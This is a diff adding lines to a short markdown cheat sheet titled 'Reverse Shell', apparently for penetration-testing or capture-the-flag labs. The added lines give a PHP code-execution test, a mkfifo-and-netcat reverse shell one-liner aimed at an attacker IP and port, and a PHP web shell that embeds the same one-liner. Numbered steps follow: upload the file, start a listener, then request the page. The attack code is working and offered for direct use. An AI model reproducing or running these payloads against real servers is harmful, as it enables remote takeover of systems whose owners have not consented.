@@ -1,5 +1,22 @@
 # Reverse Shell
 
+Test for code execution:
+```php
+<?php system('id'); ?>
+```
+
+___
+
+Reverse Shell:
+```shell-session
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f
+```
+Add it your *php* file:
+```php
+<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
+```
+Upload file and then start netcat listner, after it curl the website where you upladed the file
+___
 1. start `netcat` listener on a port of your choice
  ```
  nc -lvnp 1234
